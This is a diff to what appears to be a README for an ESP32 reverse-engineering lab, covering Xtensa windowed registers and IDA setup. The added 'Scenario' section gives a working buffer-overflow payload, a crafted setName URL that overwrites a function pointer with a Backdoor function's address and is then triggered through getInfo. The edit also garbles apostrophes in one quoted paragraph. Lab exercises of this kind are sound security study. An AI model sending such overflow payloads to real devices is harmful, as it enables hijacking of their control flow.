@@ -11,7 +11,7 @@ You can follow instructions from the following document to flash applications fr
 ## Windowed registers
 
 ```
-That’s probably one of the most special feature of the LX6, so that’s what I’ll talk about. The processor contains 64 32-bit registers but only an interval of 16 registers can be seen at each instant. A 4-bit WindowBase special register chooses which range of registers is visible and addressable. This register can be modified by WSR (Write to Special Register) but other instructions have special mechanisms with this feature.
+Thatï¿½s probably one of the most special feature of the LX6, so thatï¿½s what Iï¿½ll talk about. The processor contains 64 32-bit registers but only an interval of 16 registers can be seen at each instant. A 4-bit WindowBase special register chooses which range of registers is visible and addressable. This register can be modified by WSR (Write to Special Register) but other instructions have special mechanisms with this feature.
 ```
 * [The Xtensa architecture](https://www.lortex.org/posts/esp32/2018/03/28/the-xtensa-architecture.html)
 
@@ -42,3 +42,21 @@ RETW Rotates back the register window and jump to return address. Note that beca
 Download https://github.com/themadinventor/ida-xtensa/blob/master/xtensa.py and copy it to the following location:
 
 "%ProgramFiles%\IDA 7.1\procs"
+
+## Scenario
+
+Global variable: projectName -> Buffer overflow -> Overwrite functionInformation.funcPtr -> Call getInfo to run  functionInformation.funcPtr pointer
+
+Ex)
+
+Backdoor function (_Z8Backdoorv): 400d1dcc -> %cc%1d%0d%40
+
+http://192.168.4.1/setName?name=%C1%C2%C3%C4%C5%C6%C7%C8%C9%CA%CB%CC%CD%CE%CF%cc%1d%0d%40
+
+_Z8Backdoorv
+400d1dcc
+
+Call getInfo:
+http://192.168.4.1/getInfo
+
+
